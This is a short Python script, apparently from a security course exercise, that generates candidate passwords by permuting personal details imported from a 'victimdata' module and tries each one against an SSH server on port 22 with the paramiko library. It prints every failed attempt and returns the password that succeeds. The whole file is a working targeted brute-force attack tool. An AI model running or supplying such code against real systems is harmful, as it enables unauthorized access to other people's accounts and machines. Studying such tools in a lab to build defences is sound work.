from victimdata import *
import itertools
import paramiko
import sys
import threading

class dictionary():
    
    passwd = []
    data   = victim_data

    def __init__(self):
        for i in range(1,len(victim_data)):
            for j in itertools.permutations(self.data, i):
                str = ""
                for k in j:
                    str += k
                self.passwd.append(str)

    def print_passwd(self):
        for i in self.passwd:
            print(i)
        
    def attack(self):
        for passwd in self.passwd:
            trans = paramiko.Transport((sys.argv[1],  22))
            try:
                trans.connect(username="csc2021",  password=passwd)
            except paramiko.AuthenticationException:
                trans.close()
                print("password: %-40s is UNsuccessful" % passwd)
            else:
                print("Successful 🤖️🤖️🤖️ ! password is : %s" % passwd)
                return passwd

